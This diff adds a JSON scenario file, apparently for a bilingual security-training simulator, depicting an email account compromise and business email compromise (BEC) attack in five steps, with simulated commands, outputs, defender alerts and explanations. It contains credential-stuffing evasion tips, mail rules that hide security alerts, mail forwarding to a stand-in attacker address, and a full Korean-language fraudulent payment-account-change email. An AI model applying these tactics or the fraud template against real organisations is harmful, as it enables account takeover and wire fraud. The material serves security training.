@@ -1,0 +1,180 @@
+{
+  "id": "T1586.002",
+  "title": "이메일 계정 탈취 시뮬레이션",
+  "titleEn": "Email Account Compromise Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 크레덴셜 수집", "labelEn": "🔍 Credential Gathering", "steps": [0, 1] },
+    { "label": "⚡ 계정 탈취", "labelEn": "⚡ Account Takeover", "steps": [2, 3] },
+    { "label": "✅ BEC 공격", "labelEn": "✅ BEC Attack", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "breach", "label": "Breach DB", "x": 200, "y": 30 },
+    { "id": "m365", "label": "M365 Login", "x": 200, "y": 90 },
+    { "id": "inbox", "label": "Email Inbox", "x": 350, "y": 60 },
+    { "id": "finance", "label": "Finance Team", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "breach", "minStep": 0 },
+    { "from": "ext", "to": "m365", "minStep": 1 },
+    { "from": "m365", "to": "inbox", "minStep": 2 },
+    { "from": "inbox", "to": "finance", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "{companyName} Data", "icon": "📁" },
+    { "name": "cred_list.csv", "icon": "📄", "alert": true },
+    { "name": "bec_template.eml", "icon": "📝" }
+  ],
+  "steps": [
+    {
+      "cmd": "python3 breach_check.py --domain {companyName}.com --source dehashed,intelx,snusbase",
+      "out": "[+] Querying breach databases for {companyName}.com...\n\nDeHashed Results: 156 records\nIntelX Results: 89 records\nSnusBase Results: 203 records\n\n[+] After deduplication: 312 unique credentials\n\nSample matches:\n  cfo@{companyName}.com : P@ssw0rd2023!\n  hr.manager@{companyName}.com : Welcome123!\n  it.admin@{companyName}.com : Admin2024#\n  ceo.assistant@{companyName}.com : Company2023\n\n[+] Saved to cred_list.csv",
+      "def": "[Threat Intel] Breach database queries detected for {companyName}.com domain",
+      "defAction": "Source: Multiple breach databases\nTarget: {companyName}.com email credentials\nAction: Dark web monitoring alert triggered",
+      "desc": "유출된 데이터베이스에서 대상 도메인의 이메일 크레덴셜을 수집합니다.",
+      "descEn": "Collecting email credentials for the target domain from breach databases.",
+      "stepTitle": "유출 DB 크레덴셜 수집",
+      "stepTitleEn": "Breach Database Credential Collection",
+      "feynman": "과거에 해킹당한 웹사이트들의 사용자 정보가 다크 웹에 유출되어 있습니다. 이 데이터에서 '{companyName}.com' 이메일을 검색하면, 같은 비밀번호를 여러 사이트에 재사용한 직원들의 계정 정보를 찾을 수 있습니다.",
+      "feynmanEn": "User information from previously hacked websites is leaked on the dark web. Searching this data for '{companyName}.com' emails reveals account info of employees who reused the same password across multiple sites.",
+      "expert": "DeHashed, IntelX, SnusBase 등 브리치 데이터 검색 서비스에서 312개의 고유 크레덴셜을 수집했습니다. CFO 계정의 크레덴셜이 발견된 것은 BEC 공격의 이상적인 벡터입니다.",
+      "expertEn": "312 unique credentials were collected from breach data search services (DeHashed, IntelX, SnusBase). CFO account credentials represent an ideal BEC attack vector.",
+      "defTooltip": "🔑 위협 인텔: {companyName}.com 도메인의 유출 크레덴셜 검색 감지",
+      "defTooltipEn": "🔑 Threat Intel: Breach database queries for {companyName}.com domain detected",
+      "hackerLog": {
+        "title": "breach_results.csv",
+        "lines": [
+          { "log": "cfo@{companyName}.com : P@ssw0rd2023!", "desc": "💡 CFO 이메일 크레덴셜 발견! BEC 공격의 최우선 대상" },
+          { "log": "312 unique credentials", "desc": "💡 312개의 이메일/패스워드 조합 — 대량 크레덴셜 스터핑 가능" },
+          { "log": "it.admin@{companyName}.com", "desc": "💡 IT 관리자 계정도 노출 — 시스템 관리 권한 탈취 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "Breach Database", "desc": "과거 데이터 유출 사건에서 수집된 사용자 정보(이메일, 비밀번호 등)를 모아놓은 데이터베이스. 다크 웹이나 전문 서비스에서 검색 가능합니다" },
+        { "name": "Credential Stuffing", "desc": "유출된 크레덴셜을 다른 서비스에 대량으로 시도하는 공격. 비밀번호를 재사용하는 사용자가 피해를 입습니다" }
+      ]
+    },
+    {
+      "cmd": "python3 cred_stuff.py --targets cred_list.csv --service outlook365 --threads 10 --delay 5",
+      "out": "[+] Loading 312 credentials...\n[+] Target: https://login.microsoftonline.com\n[+] Testing with 5s delay between attempts...\n\nResults after 1,560 attempts:\n  Valid credentials: 23 (7.4%)\n  MFA-blocked: 18\n  No MFA (direct access): 5\n\nDirect Access Accounts:\n  ✓ cfo@{companyName}.com — P@ssw0rd2023!\n  ✓ hr.temp@{companyName}.com — TempPass1\n  ✓ marketing@{companyName}.com — Mkt2023!!\n  ✓ reception@{companyName}.com — Front2024\n  ✓ intern.kim@{companyName}.com — Intern123\n\n[+] CFO account — HIGH VALUE TARGET",
+      "def": "[Azure AD] Credential stuffing attack detected — 312 login attempts from single IP",
+      "defAction": "Source: 198.51.100.23\nTarget: login.microsoftonline.com\nAction: IP rate-limited after 50 attempts, Smart Lockout triggered for 18 accounts",
+      "desc": "수집된 크레덴셜로 Microsoft 365에 크레덴셜 스터핑을 실행하여 유효한 계정을 식별합니다.",
+      "descEn": "Executing credential stuffing against Microsoft 365 with collected credentials to identify valid accounts.",
+      "stepTitle": "크레덴셜 스터핑 공격",
+      "stepTitleEn": "Credential Stuffing Attack",
+      "feynman": "312개의 이메일/비밀번호를 Microsoft 365 로그인에 하나씩 시도합니다. 23개가 성공했지만, 그 중 18개는 MFA(2단계 인증)에 막혔습니다. 5개 계정은 MFA가 없어 바로 접근할 수 있고, 그 중 하나가 CFO(최고재무책임자) 계정입니다!",
+      "feynmanEn": "Testing 312 email/password combinations against Microsoft 365 login. 23 succeeded, but 18 were blocked by MFA (two-factor authentication). 5 accounts have no MFA and can be accessed directly, including the CFO (Chief Financial Officer) account!",
+      "expert": "7.4%의 크레덴셜 재사용률은 업계 평균과 일치합니다. MFA 미설정 계정 5개 중 CFO 계정은 금융 거래 권한을 가져 BEC의 최우선 대상입니다. 5초 딜레이를 넣어 Smart Lockout을 부분적으로 우회했습니다.",
+      "expertEn": "7.4% credential reuse rate matches industry average. Among 5 accounts without MFA, the CFO account has financial transaction authority, making it the top BEC target. 5-second delays partially bypassed Smart Lockout.",
+      "defTooltip": "🔐 Azure AD: 단일 IP에서 312회 로그인 시도 — 크레덴셜 스터핑 감지",
+      "defTooltipEn": "🔐 Azure AD: 312 login attempts from single IP — credential stuffing detected",
+      "hackerLog": {
+        "title": "cred_stuff_results.log",
+        "lines": [
+          { "log": "✓ cfo@{companyName}.com — No MFA!", "desc": "💡 CFO 계정 접근 성공! MFA 미설정 — 즉시 로그인 가능" },
+          { "log": "Valid: 23 (7.4%), No MFA: 5", "desc": "💡 비밀번호 재사용률 7.4% — 5개 계정은 추가 인증 없이 접근" },
+          { "log": "MFA-blocked: 18", "desc": "💡 MFA가 설정된 18개 계정은 차단 — MFA의 중요성 입증" }
+        ]
+      },
+      "terms": [
+        { "name": "MFA (Multi-Factor Authentication)", "desc": "비밀번호 외에 추가 인증(OTP, 생체인증 등)을 요구하는 보안 방식. 크레덴셜 스터핑의 가장 효과적인 방어책입니다" },
+        { "name": "Smart Lockout", "desc": "Azure AD의 지능형 계정 잠금 기능. 의심스러운 로그인 시도를 탐지하여 자동으로 계정을 잠급니다" }
+      ]
+    },
+    {
+      "cmd": "python3 m365_takeover.py --account cfo@{companyName}.com --setup-persistence --hide-activity",
+      "out": "[+] Logged in as cfo@{companyName}.com\n[+] Session established via IMAP (legacy protocol)\n\n[+] Persistence mechanisms:\n  ✓ Mail rule created: 'Security Alerts' → Deleted Items\n  ✓ Mail rule created: 'Password Reset' → Deleted Items\n  ✓ Mail forwarding: BCC to attacker-drop@proton.me\n  ✓ OAuth app registered: 'Annual Report Tool'\n\n[+] Inbox analysis:\n  Total emails: 8,456\n  Financial threads: 127\n  Vendor payment threads: 34\n  Executive conversations: 89",
+      "def": "[M365 Security] Suspicious mail rules and OAuth app created on CFO account",
+      "defAction": "Source: cfo@{companyName}.com\nTarget: Exchange Online\nAction: Mail rule creation logged, OAuth app flagged for review",
+      "desc": "CFO 계정에 로그인하여 지속 접근을 위한 메일 규칙과 OAuth 앱을 설정합니다.",
+      "descEn": "Logging into the CFO account and setting up mail rules and OAuth app for persistent access.",
+      "stepTitle": "계정 탈취 및 지속 접근 설정",
+      "stepTitleEn": "Account Takeover and Persistence Setup",
+      "feynman": "CFO 이메일에 접속한 후, '보안 알림' 메일이 자동으로 삭제되도록 규칙을 만듭니다. 이렇게 하면 CFO가 비정상 로그인 알림을 볼 수 없습니다. 또한 모든 메일을 공격자의 숨겨진 이메일로 자동 전달하고, OAuth 앱을 등록하여 비밀번호가 변경되어도 접근을 유지합니다.",
+      "feynmanEn": "After accessing the CFO email, rules are created to automatically delete 'Security Alert' emails. This prevents the CFO from seeing abnormal login notifications. All emails are auto-forwarded to the attacker's hidden email, and an OAuth app maintains access even if the password changes.",
+      "expert": "IMAP 레거시 프로토콜을 통한 접속은 조건부 접근 정책을 우회합니다. 메일 규칙으로 보안 알림을 삭제하여 탐지를 지연시키고, OAuth 앱 등록으로 비밀번호 변경 후에도 접근을 유지합니다(T1098.002).",
+      "expertEn": "IMAP legacy protocol access bypasses Conditional Access policies. Mail rules delete security alerts to delay detection, and OAuth app registration maintains access even after password changes (T1098.002).",
+      "defTooltip": "⚠️ M365 보안: CFO 계정에 의심스러운 메일 규칙과 OAuth 앱 생성됨",
+      "defTooltipEn": "⚠️ M365 Security: Suspicious mail rules and OAuth app created on CFO account",
+      "hackerLog": {
+        "title": "takeover.log",
+        "lines": [
+          { "log": "Mail rule: 'Security Alerts' → Deleted", "desc": "💡 보안 알림 자동 삭제 — CFO는 침해 사실을 모릅니다" },
+          { "log": "BCC forwarding to attacker-drop@proton.me", "desc": "💡 모든 이메일이 공격자에게 실시간 전달됨" },
+          { "log": "Financial threads: 127", "desc": "💡 재무 관련 이메일 127건 — BEC 공격을 위한 정보 수집 완료" }
+        ]
+      },
+      "terms": [
+        { "name": "Mail Rule Abuse", "desc": "이메일 규칙을 악용하여 보안 알림을 자동 삭제하거나 메일을 외부로 전달하는 기법. 계정 탈취 후 탐지를 피하는 데 사용됩니다" },
+        { "name": "OAuth App Persistence", "desc": "악성 OAuth 앱을 등록하여 비밀번호 변경 후에도 이메일 접근을 유지하는 기법. 앱 권한을 명시적으로 해지해야 차단됩니다" }
+      ]
+    },
+    {
+      "cmd": "python3 bec_recon.py --inbox cfo@{companyName}.com --find-payment-threads --analyze-patterns",
+      "out": "[+] Analyzing CFO inbox for BEC opportunities...\n\n[+] High-value payment thread found:\n  Subject: 'Re: Q1 2026 Vendor Payment — ABC Consulting'\n  Participants: cfo@{companyName}.com, ap@{companyName}.com\n  Amount: $48,500 (monthly recurring)\n  Payment method: Wire transfer\n  Bank: Woori Bank, Account: 1002-***-****\n  Next payment: 2026-03-15\n\n[+] Communication patterns:\n  CFO typical reply time: 2-4 hours\n  Writing style: Formal, uses '확인 부탁드립니다'\n  Signature: '(주){companyName} CFO 김재현'",
+      "def": "[M365 DLP] Financial data accessed in bulk from CFO mailbox",
+      "defAction": "Source: cfo@{companyName}.com (compromised)\nTarget: Payment thread analysis\nAction: Sensitive data access logged, DLP policy not configured for internal access",
+      "desc": "CFO 받은편지함에서 결제 관련 스레드를 분석하여 BEC 공격에 필요한 정보를 수집합니다.",
+      "descEn": "Analyzing payment-related threads in the CFO inbox to gather intelligence for BEC attack.",
+      "stepTitle": "BEC 정보 수집 — 결제 스레드 분석",
+      "stepTitleEn": "BEC Intelligence — Payment Thread Analysis",
+      "feynman": "CFO의 이메일에서 '돈이 오가는' 대화를 찾습니다. ABC Consulting에 매월 4,850만 원을 송금하는 패턴을 발견했습니다. 다음 결제일은 3월 15일입니다. CFO의 말투, 서명, 답장 시간까지 분석하여 완벽하게 흉내 낼 준비를 합니다.",
+      "feynmanEn": "Finding conversations about money transfers in the CFO's email. Discovered a pattern of monthly $48,500 wire transfers to ABC Consulting. Next payment is March 15th. Analyzing the CFO's writing style, signature, and reply time to perfectly impersonate them.",
+      "expert": "결제 스레드 분석으로 거래 금액($48,500), 결제 방식(Wire transfer), 은행 정보, 다음 결제일을 파악했습니다. CFO의 커뮤니케이션 패턴(응답 시간, 문체, 서명)을 학습하여 사회공학적 공격의 정확도를 극대화합니다.",
+      "expertEn": "Payment thread analysis revealed transaction amount ($48,500), payment method (Wire transfer), bank info, and next payment date. Learning the CFO's communication patterns (response time, writing style, signature) maximizes social engineering accuracy.",
+      "defTooltip": "💰 M365 DLP: CFO 메일함에서 재무 데이터 대량 접근 감지",
+      "defTooltipEn": "💰 M365 DLP: Financial data accessed in bulk from CFO mailbox",
+      "hackerLog": {
+        "title": "bec_recon.log",
+        "lines": [
+          { "log": "Amount: $48,500 monthly", "desc": "💡 매월 반복되는 대규모 거래 발견 — BEC 공격의 이상적인 대상" },
+          { "log": "Next payment: 2026-03-15", "desc": "💡 14일 후 결제 예정 — 그 전에 계좌 변경 요청을 보내야 합니다" },
+          { "log": "Style: '확인 부탁드립니다'", "desc": "💡 CFO의 말투 학습 완료 — 완벽한 위장 이메일 작성 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "BEC (Business Email Compromise)", "desc": "기업 이메일을 탈취하여 거래처나 임원을 사칭, 송금을 유도하는 사기. FBI 통계로 연간 수십억 달러의 피해가 발생합니다" },
+        { "name": "Wire Transfer Fraud", "desc": "은행 송금을 이용한 사기. 송금 후 취소가 어렵고, 해외 계좌로 이체되면 자금 회수가 거의 불가능합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 bec_attack.py --from cfo@{companyName}.com --to ap@{companyName}.com --template bec_template.eml --amount 48500 --new-account 'Shinhan 110-***-***'",
+      "out": "[+] Composing BEC email...\n\nFrom: cfo@{companyName}.com (legitimate account)\nTo: ap@{companyName}.com\nSubject: Re: Q1 2026 Vendor Payment — ABC Consulting\nThread-ID: <original_thread_id@{companyName}.com>\n\nBody:\n'안녕하세요,\nABC Consulting 측에서 은행 계좌가 변경되었다고 연락이 왔습니다.\n다음 결제부터 아래 계좌로 변경 부탁드립니다.\n\n신한은행 110-***-***\n예금주: ABC Consulting Korea\n\n확인 부탁드립니다.\n\n(주){companyName} CFO 김재현'\n\n[+] Email sent successfully\n[+] Reply-to thread maintained (legitimate conversation history)",
+      "def": "[Email Gateway] BEC attempt — payment account change request from compromised CFO account",
+      "defAction": "Source: cfo@{companyName}.com (compromised)\nTarget: ap@{companyName}.com\nAction: Wire transfer account change request — requires out-of-band verification",
+      "desc": "탈취한 CFO 계정에서 경리팀에 계좌 변경을 요청하는 BEC 이메일을 발송합니다.",
+      "descEn": "Sending a BEC email from the compromised CFO account requesting a payment account change to the accounting team.",
+      "stepTitle": "BEC 공격 실행 — 계좌 변경 요청",
+      "stepTitleEn": "BEC Attack Execution — Account Change Request",
+      "feynman": "CFO의 실제 이메일 계정에서, 기존 대화 스레드에 답장 형태로 '계좌가 변경되었으니 다음부터 새 계좌로 보내달라'는 이메일을 보냅니다. CFO의 말투, 서명, 이메일 스레드 모두 진짜이므로 경리팀이 의심하기 매우 어렵습니다.",
+      "feynmanEn": "From the CFO's actual email account, a reply is sent in the existing conversation thread saying 'The account has changed, please send future payments to the new account.' The CFO's writing style, signature, and email thread are all genuine, making it very hard for the accounting team to suspect.",
+      "expert": "실제 CFO 계정에서 발송되므로 SPF/DKIM/DMARC 모두 통과합니다. 기존 Thread-ID를 유지하여 대화 연속성이 보장되고, CFO의 실제 서명과 문체를 사용합니다. $48,500은 기존 거래 금액과 동일하여 이상 거래 탐지를 우회합니다.",
+      "expertEn": "Sent from the actual CFO account, passing SPF/DKIM/DMARC. Maintains original Thread-ID for conversation continuity, uses CFO's actual signature and writing style. $48,500 matches existing transaction amounts, bypassing anomaly detection.",
+      "defTooltip": "🚨 이메일 게이트웨이: 탈취된 CFO 계정에서 결제 계좌 변경 요청 — BEC 시도",
+      "defTooltipEn": "🚨 Email Gateway: Payment account change request from compromised CFO account — BEC attempt",
+      "hackerLog": {
+        "title": "bec_attack.log",
+        "lines": [
+          { "log": "From: cfo@{companyName}.com (legitimate)", "desc": "💡 실제 CFO 계정에서 발송 — SPF/DKIM/DMARC 모두 통과" },
+          { "log": "Thread-ID: original conversation", "desc": "💡 기존 대화 스레드에 답장 — 의심의 여지가 없음" },
+          { "log": "Amount: $48,500 (matches pattern)", "desc": "💡 기존 거래 금액과 동일 — 이상 거래 탐지 우회" }
+        ]
+      },
+      "terms": [
+        { "name": "SPF/DKIM/DMARC", "desc": "이메일 발신자를 검증하는 보안 프로토콜. 실제 계정에서 발송된 BEC 이메일은 이 모든 검증을 통과하므로 기술적 탐지가 불가능합니다" },
+        { "name": "Out-of-Band Verification", "desc": "이메일이 아닌 다른 채널(전화, 대면 확인)로 요청을 검증하는 것. BEC 방어의 가장 효과적인 수단입니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "bash", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "python3 breach_check.py (PID: 7101)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "python3 cred_stuff.py (PID: 7134)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "python3 m365_takeover.py (PID: 7201)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "python3 bec_recon.py (PID: 7289)", "depth": 1, "alert": false, "minStep": 3 },
+    { "name": "python3 bec_attack.py (PID: 7345)", "depth": 1, "alert": true, "minStep": 4 }
+  ]
+}
